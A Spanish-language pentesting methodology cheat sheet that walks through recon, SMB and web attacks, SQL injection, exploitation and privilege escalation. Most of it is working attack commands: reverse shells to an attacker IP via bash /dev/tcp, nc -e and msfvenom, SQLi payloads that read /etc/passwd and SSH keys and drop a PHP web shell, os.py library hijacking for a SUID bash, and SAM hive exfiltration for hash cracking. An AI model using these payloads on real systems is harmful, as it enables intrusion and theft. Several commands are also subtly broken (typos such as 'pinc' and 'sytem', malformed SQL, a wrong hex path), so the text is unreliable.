# ***Pentesting: Methodology***

`Pentesting Methodology` este documento sirve para tener una metodología a la hora de hacer pentesting en empresas. Donde encontraras comandos para ayudarte rapidamente a realizar pentesting desde lo mas básico a lo avanzado.

> [!NOTE]
> Las direcciones IP o segmento que le corresponde al atacanque y a la victima son las siguiente:
> - VICTIMA = $${\color{red}192.168.0.0/24}$$	
> - ATACANTE = $${\color{lightgreen}10.10.10.10/24}$$	


## <ins>Fase 1: Reconocimiento/Enumeración</ins> (escaneo) 

#### 1.1. Verificar si está encendido.      
   ```bash
   pinc -c 1 192.168.0.10
   ```

#### 1.2. Tracert para ver porque nodos pasan, si el TTL es 64 corresponde a un Linux y si es 128 a Windows.      
   ```bash
   pinc -c 1 192.168.0.10 -R
   ```

#### 1.3. Mostrar las redes disponibles.      
   ```bash
   sudo netstat –rn 
   ```

#### 1.4. Escaneo de puertos TCP abiertos.      
   ```bash
   nmap -p- --open -T5 -v -n 192.168.0.10 -oG allPorts
   ```
  - _El parametro **T5** es temporizador de escaneo, mientras mas alto va mas rápido, **T0** es mas lento y **T5** es el tope, además es muy ruidoso no recomendado en escaneos reales ni en el excamen de  eJPT._
    
#### 1.5. Escaneo muy rapido (NO recomendado en pentesting reales).      
   ```bash
   nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 192.168.0.10 -oG allPorts
   ```
 - _El parametro **-sS** es tcp sync port scan, el parametro **--min--rate** controla el número de paquetes que se quiere enviar 5 mil x segundo, el parametro **-Pn** es para evitar descubrimientode host mediante resolución de nombres del protocolo ARP._

#### 1.6. Escaneo exhaustivo de puertos.      
   ```bash
   nmap -sC -sV -p22,80 192.168.0.10 -oN targeted
   ```

#### 1.7. ***WFUZZ*** enumerar que rutas existen en el sitio web.  
   Se emplea un total de 200 hilos y ocultamos el codigo de estado 404 Not Found
   ```bash
   wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.0.10/FUZZ
   ```


----------------------------------------------------------------------------

## <ins>Fase 2: Análisis de Vulnerabilidades</ins> 

Siempre revisar el código fuente del sitio web, puede que haya nombres de usuario, contraseñas, acceso para desarrolladores, etc. **Clic derecho -> inspeccionar código fuente** o presionar **Control+U**

### 2.1. Puerto 80/443 - HTTP/HTTPS

#### 2.1.1 Identificar el gestor de contenido web.      
   ```bash
   whatweb http://192.168.0.10
   ```
   - _Si nos proporcionan otros dominios agregarlos al **/etc/hosts**_
> [!TIP]
> También se puede identificar la tecnología web utilizando la extensión en Mozilla lamado: $${\color{lightgreen}Wappanalyzer}$$.
> https://addons.mozilla.org/es/firefox/addon/wappalyzer/

#### 2.1.2 Mirar las caberas de respuestas. Como ejemplo esta web usa el puerto 8080      
   ```bash
   curl -s -X GET "http://192.168.0.10:8080/"

   HTTP/1.1 401 Unauthorized
   Set-Cookie: .....
   Server: .....
   WWW-Authenticate: Basic realm="Windows Device Portal"
   Date: ........
   Content-Length: 0
   ```
> [!TIP]
> Como atacante debemos investigar la información que tenemos, para este caso una brecha en la autenticación básica "Windows Device Portal".
> Luego, buscar vulnerabilidades haciadas en google como: Windows Device Portal exploit github o alternar palabras Windows Device Portal github exploit.


#### 2.1.2 Si existe un servidor web, aplicar fuerza bruta de directorio con nmap (por ejemplo, /admin, /login, /phpmyadmin, etc.).      
   ```bash
   nmap --script http-enum -p80 192.168.0.10 -oN webScan 
   ```

#### 2.1.3. Si existe una web en PHP, inyectar código en las entradas de usuario.      
   ```bash
   <?php system("whoami"); ?> 
   ```

#### 2.1.4. Inspeccionar certificado SSL, para obtener correos y dominios.  
   ```bash
   openssl s_client -connect 192.168.0.10:443 
   ```




### 2.2. Puerto 445 - SMB

#### 2.2.1. Es un servidor de dominio SMB, podemos identificar el sistema operativo, la versión en uso o su tipo de arquitectura.      
   ```bash
   crackmapexec smb 192.168.0.10
   ```
   - _si el resultado dice Windows 6.1 es un Linux porque lo interpreta así_

#### 2.2.2. Si se dectectó un nombre de dominio, agregarlo el nombre de dominio y la IP de la victima en $${\color{lightblue}/etc/hosts}$$      
   ```bash
   192.168.0.10     dominio.local
   ```

#### 2.2.3. Listar los recuros compartidos a nivel de red.      
   ```bash
   smbclient -L 192.168.0.10 -N
   ```

#### 2.2.4. Si el puerto 135 esta abierto, podemos probar con RPC client ya que es un controlador de dominio.      
   ```bash
   rpcclient -U "" 192.168.0.10 -N 
   rpcclient $> enumdomusers 
   result was NT_STATUS_ACCESS_DENIED  
   ```
   - _Si la respuesta de rpcclient es **ACEES_DENIED** significa que no se puede enumerar_

#### 2.2.5. Del sitio web podemos identificar algunos nombres de usuarios para reallizar fuerza bruta. Lo guardamos en un archivo llamado **users**.  
   ```bash
   crackmapexec smb 192.168.0.10 -u users -p users --continue-on-success | grep -v -i "failure"  
   ```
   - _Las contraseñas serán las mismas que los nombres de usuarios._

#### 2.2.6. Generar diccionario de contraseñas con la información del sitio web de forma automática y lo guardamos en un fichero llamado **passwords**.  
   ```bash
   cewl -w passwords http://domail.local/..../ --with-numbers   
   ```

   - _Ahora usamos ese fichero._
   ```bash
   crackmapexec smb 192.168.0.10 -u users -p passwords --continue-on-success | grep -v -i "failure"

   SMB     192.168.0.10     445     FUSE    [-] domain.local\nombre_usuario:contraseña STATUS_PASSWORD_MUST_CHANGE 
   ```

  - _Si nos aparece el mensaje **STATUS_PASSWORD_MUST_CHANGE** significa que la contraseña es válida y podemos cambiar la contraseña._
   ```bash
   smbpasswd -r 192.168.0.10 -U "nombre_usuario" 

Old SMB password: contraseña
   ```

#### 2.2.7. Probar nuevamente enumerar recursos compartidos con fuerza bruta.  
   ```bash
   crackmapexec smb 192.168.0.10 -u "nombre_usuario" -p "contraseña_nueva"  
   ```

#### 2.2.8. Ahora como ya se tiene contraseñas validas se puede hacer rpcclient.  
   ```bash
   rpcclient -U 'nombre_usuario%contraseña_nueva' 192.168.0.10 

rpcclient $> enumdomusers 
rpcclient $> enumprinters    
   ```

#### 2.2.9. Probar acceso sobre la administración remota de Windows.  
   ```bash
   crackmapexec winrm 192.168.0.10 -u 'nombre_usuario' -p 'contraseña' 

WINRM    192.168.0.10     5985     FUSE    [-] domain.local\nombre_usuario:contraseña (Pwn3d!)     
   ```

#### 2.2.10. Si en la respuesta nos aparece **Pwned** significa que tenemos privilegios.  Teniendo acceso remoto vemos si podemos acceder al directorio del administrador. 
   ```bash
   evil-winrm -i 192.168.0.10 -u 'nombre_usuario' -p 'contraseña'

    *Evil-WinRM* PS C:\Users\nombre_usuario\Desktop> cd C:\Users\Administrator
   ```
   - _Si no se puede acceder al directorio del administrador intentar a directorio temporal: **cd C:\Windows\Temp**_
   ```bash
   *Evil-WinRM* PS C:\Windows\Temp> whoami /priv
   ```
   - _Con **whoami /priv** enumeramos los privilegios del usuario con el que tenemos la contraseña. Si queremos ver mas información usar el comando **whoami /all**._

#### 2.2.11. Compartir archivos de Windows a Linux en cmd
   - _En Windows escribir el primer comando y en linux el segundo comando._
   ```bash
     python -m http.server 
   ```
   ```bash
     wget http://192.168.0.10:8000/nombre_archivo 
   ```
#### 2.2.12. Ver los privilegios sobre los recursos compartidos, para ver existen permisos de READ ONLY o READ and WRITE.      
   ```bash
   smbmap -H  192.168.0.10
   ```
#### 2.2.13. Conectarse por SMB al recursos compartido.      
   ```bash
   smbclient //192.168.0.10/recurso_compartido -N 
   smb: \> dir (para listar los directorios) 
   smb: \> put test.php (put para subir archivos) 
   ```
#### 2.2.14. Si encontramos usuario y contraseña nos logeamos.      
   ```bash
   smbmap -H  192.168.0.10  -u 'nombre_usuario' -p 'contraseña'  
   ```
#### 2.2.15. Si encontramos recursos compartidos con capacidad de escritura, entonces podemos subir un archivo reverse shell.      
   ```bash
   smb: \> put reverse.php  
   ```
   - _Contenido del archivo para tener una conexión por el puerto 443 (https)_
   ```bash
   <?php 
     system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'"); 
   ?>   
   ```

### 2.3. SQLi - MySQL

#### 2.3.1 Metodo GET en la URL.      
   ```bash
   http://192.168.0.10/room.php?cod=-1
   ```
   - _A partir de **cod=-1** se puede inyectar SQL_

#### 2.3.2 **Order by**, para identificar cuantas columnas tiene el Query.  
   ```bash
   http://192.168.0.10/room.php?cod=-1 order by 7-- - 
   ```

#### 2.3.3 **Union**, una vez identificado la cantidad de columnas probamos lo siguiente.  

   - _Si en la pagina aparece algun numero entonces es vulnerable_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,3,4,5,6,7-- - 
   ```
   - _Por ejemplo el número 3 aparece en el sitio web, entonces corroboramos con inyectar una palabra_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,"test",4,5,6,7-- -   
   ```
   - _Mostar el nombre de la base de datos o versión o usuarios._
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,database(),4,5,6,7-- -   
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,version(),4,5,6,7-- -      
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,user(),4,5,6,7-- -       
   ```
 - _Leer archivos de la maquina victima, listar puertos internos o listar usuarios._
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/etc/passwd"),4,5,6,7-- -      
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/proc/net/tcp"),4,5,6,7-- -      
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/proc/net/fib_trie"),4,5,6,7-- -      
   ```
- _Leer archivos de la maquina victima, en formato ofuscado convertiendolo a hexadecimal. Agregamos **0x** adelante del hexadecimal._
   ```bash
   echo "/etc/passwd" | tr -d '\n' | xxd -ps  

   2f6574632f786173737764       
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file(0x2f6574632f786173737764),4,5,6,7-- -         
   ```
- _Listar el RSA SSH del usuario que tenga bash, esto lo sabemos leeyendo primero el archivo /etc/passwd._
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/home/nombre_usuario/.ssh/id_rsa"),4,5,6,7-- -        
   ```

#### 2.3.4 Enumerar **nombres de la base de datos**.  

   - _Enumerar esquemas_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - 
   ```
 - _Asignado limites en la enumaración. Va incrementado **limit n,1**_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- -  
   ```
    ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 1,1-- -  
   ```  

#### 2.3.5 Enumerar **tablas de la base de datos**, podemos usar nuevamente limit.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="nombre_bd" limit 0,1-- -  
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="nombre_bd" limit 1,1-- -  
   ```

#### 2.3.6 Enumerar **columnas de la tabla de la base de datos**, podemos usar nuevamente limit.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="nombre_bd" and table_name="nombre_tabla" limit 0,1-- -   
   ```
   ```bash
      http://192.168.0.10/room.php?cod=-1 order union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="nombre_bd" and table_name="nombre_tabla" limit 1,1-- -  
   ```

#### 2.3.6 **Group concat** para agrupar y concatenar en una sola fila.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="nombre_bd" and table_name="nombre_tabla" limit 3,1-- -    
   ```

#### 2.3.7 Carga de archivos.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,"Hola esto es una prueba",4,5,6,7 into outfile "/var/www/html/probando.txt"-- -     
   ```
   - _Validar si cargó el archivo http://192.168.0.10/probando.txt, significa que la ruta /var/www/html es correcta y se tiene capacidad de escritura._


### 2.4. Puerto 21 - FTP

#### 2.4.1 Usuarios anonimos.      
   ```bash
   ftp 192.168.0.10  
   Name(): anonymous 
   Password: [enter no ingresar contraseña] 
   530 Login incorrect  
   ```

### 2.5. Puerto 53 - DNS

#### 2.5.1 Ataque de transferencias de zonas, primero vamos a tramitar peticiones DNS.     
   ```bash
   dig @192.168.0.10 dominio.local ns  
   ```
#### 2.5.2 Ataque de transferencias de zonas. Se puede obtener subdominios adicionales. Si se encuentra más dominios potenciales agregarlos al /etc/hosts     
   ```bash
   dig @192.168.0.10 dominio.local axfr  
   ```

### 2.6. Directory Path Traversal - PHP

#### 2.6.1 Si el sitio web PHP es vulnerable.     
   ```bash
   https://dominio.local/dashboard.php?pagename=../../../../../../etc/passwd  
   ```
   - _Si se debe colocar extensión PHP al final, se puede escapar con **Null-byte Injection** con %00 o \x00_
   ```bash
   https://dominio.local/dashboard.php?pagename=../../../../../../etc/passwd%00   
   ```



----------------------------------------------------------------------------


## <ins>Fase 3: Explotación</ins> 

#### 3.1 Crear una revershell.      
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT:443 -f exe -o reverse.exe
   ```

### 3.2. SQLi - MySQL

#### 3.2.1 Enviar una Shell PHP.  

   - _Con esto el servidor nos ejecutara el comando que nos interesa en la URL solo le pasamos en comando: http://192.168.0.10/shell.php?**cmd=id**_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,"<?php sytem($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/shell.php"-- - 
   ```
   - _Entablamos una revershell y desde Kali nos ponemos en escucha **nc -nlvp 443**_
   ```bash
   http://192.168.0.10/shell.php?cmd=nc -e /bin/bash 10.10.10.10 443   
   ```
   - _Estando conectados lanzamos una shell mas interactiva, para ello hacemos tratamiento a la tty, presionamos control+z para salir del puerto en escucha y ejecutamos_
   ```bash
   Paso 1: $ script /dev/null -c bash   
   Paso 2: Control Z
   Paso 3: stty raw -echo; fg (presionar enter) 
   Paso 4: reset (para reiniciar la configuración de la terminal) 
   Paso 5: xterm (operamos con un tipo de terminal xterm) 
   Paso 6: export TERM=xterm (exportamos variable de entorno) 
   Paso 7: export SHELL=bash (exportamos variable de entorno)
   Paso 8: Ahora ya podemos usar control+c, subir, bajar, izquierda, derecha.
   Paso 9: stty size (ver el total de las dimensiones en otra terminal del kali)
   Paso 10: stty row XX columns YY (esto va en la conexión establecida con la victima)
   ```

#### 3.2.2 Buscar exploit en phpmyadmin.  
   ```bash
   searchsploit phpmyadmin 4.8 
   ```




----------------------------------------------------------------------------


## <ins>Fase 4: Escalada de privilegios</ins> 

### 4.1 LINUX

#### 4.1.1. Comprobar si podemos acceder al directorio /root/. Si el permiso es denegado entonces no tenemos permisos de root.      
   ```bash
   cd /root/  
   ```

#### 4.1.2. Enumerar el sistema.      
   - Identificar en que grupo nos encontramos
   ```bash
   id 
   ```
   - Identificar versión
   ```bash
   uname -a
   lsb_release -a 
   ```
   - Identificar si tiene otras IP address
   ```bash
   hostname -I
   ```

#### 4.1.3. Buscar privilegios SUID.      
   ```bash
   find \-perm -4000 2>/dev/null 
   ```

#### 4.1.4. Crear un monitor de procesos en bash que detecta cambios en los procesos que se ejecutan en el sistema en tiempo real.      
   ```bash
   cd /dev/shm/   (normalmente este directorio tiene capacidad de escritura como tmp)
   touch procmon.sh (creamos el fichero) 
   chmod +x procmon.sh (damos permisos de ejecución) 
   nano procmon.sh  (editamos el fichero)
   ./procmon.sh (ejecutar)
   ```
   - _Codigo del fichero procmon.sh_
   ```bash
   #!/bin/bash 
   function ctrl_c(){ 
     echo -e "\n[!] Saliendo...\n" 
     exit 1 
   } 
   trap ctrl_c INT 
   old_process=$(ps -eo command) 
   while true; docker 
     new_process=$(ps -eo command) 
     diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "command|procmon" 
     old_process=$new_process 
   done  
   ```

#### 4.1.5. Buscar si se esta ejecutando un script en python, para poder modificarlo.
   - _Acceder a la ruta donde se encuentre y vemos el permiso de escritura o lectura_
   ```bash
   ls -l /opt/server_admin/reporter.py  
   -rwxr--r-- 1 root .............. (el grupo otro solo tiene permiso de lectura)
   ```
   - _Leemos el archivo en busca de librerias_
   ```bash
   cat /opt/server_admin/reporter.py 

   import os (encontramos una libreria llamada os.py)
   code... 
   code... 
   code... 
   ``` 
   - _Buscamos la libreria y ver la ruta donde se encuentra_
   ```bash
   locate os.py  
   ls -l /usr/lib/ | grep "python2.7" 
   drwxrwxrwx root root python2.7  ...... (el grupo otros tiene permiso de lectura, escritura y ejecución rwx)
   ``` 
  - _Modificar la libreria os.py e inyectar al final del fichero un código malicios para hacer llamada a nivel de sistema y asigne privilegios SUID a la bash_
   ```bash
   nano /usr/lib/python2.7/os.py

   system("chmod 4755 /bin/bash") 
   ```


### 4.2 WINDOWS

#### 4.2.1. Busqueda recursiva a nivel de string.      
   ```bash
   C:\>dir /r /s flag.txt  
   ```
#### 4.2.2. Ver los propietarios de un archivo.      
   ```bash
   C:\>icacls flag.txt
   ```
#### 4.2.3. Averiguar la contraseña de un usuario sin utiliza Mimikatz (sin listar las credecnciales almacenadas en la memoria). 
   - Si somos adminsitradores entonces sería crear una copia de la SAM y SYSTEM
   ```bash
   C:\Temp>reg save HKLM\system system.backup
   C:\Temp>reg save HKLM\sam sam.backup
   ```
   - Desde la maquina de atacante crear un recurso compartido a nivel de red para transferirnos los archivos que creamos en Windows.
   ```bash
   impacket-smbserver smbFolder $(pwd) -smb2support -username paulportanc -password paulportanc123
   ```
   - Desde la maquina victica conectarso al SMB compartido.
   ```bash
   C:\Temp>net use x: \\10.10.10.10\smbFolder /user:paulportanc paulportanc123
   C:\Temp>dir x:\   (ahora vamos a ver los recursos de la maquina del atacanque
   C:\Temp>copy sam.backup x:sambackup   (creo una copia de la sam y lo meto en el recurso compartido x, en la maquina del atacante deberia verse el archivo sam)
   C:\Temp>copy system.backup x:systembackup
   ```
   - Desde la maquina de atacante con secretsdump.py obtenemos los haches de los usuarios del sistema.
   ```bash
   secretsdump.py -sam sambackup -system systembackup

   [*] Target system bootKey: 0x4ab3b44b4533bd133ab
   [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
   Administrator:.....................
   Guest:...............
   DefaultAccount:.............
   DevToolUser:..............
   app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
   [*] Cleaning up...
   ```
   - Copiar los hashes en un archivo llamado hashes
   ```bash
   nano hashes

   app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
   ```
   - Crackear con fuerza bruta por diccionario con John
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=NT
   ```



> [!Warning]
> 
> ### DISCLAIMER
> Este documento está destinado únicamente para fines educativos y de hacking ético. Sólo debe utilzarse para probar sistemas de su propiedad o para los que tenga permiso explícito para probar. El uso no autorizado de sitios web o sistemas de terceros sin consentimiento es ilegal y poco ético.







> [!IMPORTANT]
> Crucial information necessary for users to succeed.

> [!CAUTION]
> Negative potential consequences of an action.



